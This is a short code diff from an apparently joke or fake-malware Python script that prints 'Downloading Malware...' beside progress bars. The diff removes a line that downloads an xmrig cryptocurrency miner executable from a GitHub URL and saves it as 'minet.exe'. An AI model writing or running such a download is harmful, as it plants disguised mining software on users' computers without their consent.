@@ -64,7 +64,6 @@ for i in tqdm(range(350)):
 lprint("Signed!")
 lprint("Downloading Malware...")
 result = 0
-urlretrieve('https://github.com/xemulat/MyFilesForDDL/blob/main/xmrig.exe', 'minet.exe')
 for i in tqdm(range(350)):
     sleep(0.000001)
     result += i
